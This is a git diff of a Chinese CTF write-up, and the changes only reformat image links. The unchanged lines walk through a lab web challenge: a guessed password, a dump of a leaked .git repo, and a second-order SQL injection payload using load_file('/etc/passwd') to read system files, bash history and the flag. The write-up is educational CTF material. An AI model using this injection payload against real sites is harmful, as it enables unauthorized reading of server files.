@@ -1,10 +1,10 @@
-![[Pasted image 20230119140827.png|500]]
+![](<./img/Pasted image 20230119140827.png>)
 
-![[Pasted image 20230119140851.png|1000]]
+![](<./img/Pasted image 20230119140851.png>)
 
 尝试发帖时被要求登陆
 
-![[Pasted image 20230119141013.png|500]]
+![](<./img/Pasted image 20230119141013.png>)
 
 一时竟没想到是猜密码
 
@@ -13,25 +13,25 @@ username: zhangwei
 password: zhangwei666
 ```
 
-![[Pasted image 20230119141928.png|1000]]
+![](<./img/Pasted image 20230119141928.png>)
 
 ```
 /comment.php?id=1
 ```
 
-![[Pasted image 20230119142123.png|500]]
+![](<./img/Pasted image 20230119142123.png>)
 
 # 获取源码
 
 扫描目录
 
-![[Pasted image 20230119142301.png|1000]]
+![](<./img/Pasted image 20230119142301.png>)
 
 存在`git`泄露
 
-![[Pasted image 20230119142408.png|1000]]
+![](<./img/Pasted image 20230119142408.png>)
 
-![[Pasted image 20230119142530.png|500]]
+![](<./img/Pasted image 20230119142530.png>)
 
 被骗了.jpg
 
@@ -45,7 +45,7 @@ githacker --url http://99171b24-38c9-4bf6-ae83-d4cecaa108ef.node4.buuoj.cn:81/.g
 git log --reflog
 ```
 
-![[Pasted image 20230119144942.png|700]]
+![](<./img/Pasted image 20230119144942.png>)
 
 可以看出进行过版本回退
 
@@ -125,7 +125,7 @@ set category = '',content=load_file('/etc/passwd')/*',
     bo_id = '$bo_id'
 ```
 
-![[Pasted image 20230119153110.png|700]]
+![](<./img/Pasted image 20230119153110.png>)
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -156,7 +156,7 @@ www:x:500:500:www:/home/www:/bin/bash
 
 而且通常非登录用户的登录`shell`都设为`nologin`以防止其登录，而`www`的登录`shell`却被设置为`bash`，此事必有蹊跷
 
-![[Pasted image 20230119154202.png|700]]
+![](<./img/Pasted image 20230119154202.png>)
 
 读取`/home/www/.bash_history`
 
@@ -196,16 +196,16 @@ for i in range(len(s) // 2):
     f.write(chr(int(ss, base=16)))
 ```
 
-![[Pasted image 20230119164005.png|1000]]
+![](<./img/Pasted image 20230119164005.png>)
 
 读取`/tmp/html/flag_8946e1ff1ee3e40f.php`
 
-![[Pasted image 20230119164349.png|1000]]
+![](<./img/Pasted image 20230119164349.png>)
 
 然后发现这个`flag`是假的QAQ
 
 真正的`flag`在`/var/www/html/`下
 
-![[Pasted image 20230119164540.png|1000]]
+![](<./img/Pasted image 20230119164540.png>)
 
 #Web #PHP #代码审计 #git泄露 #DS_Store泄露 #二次注入
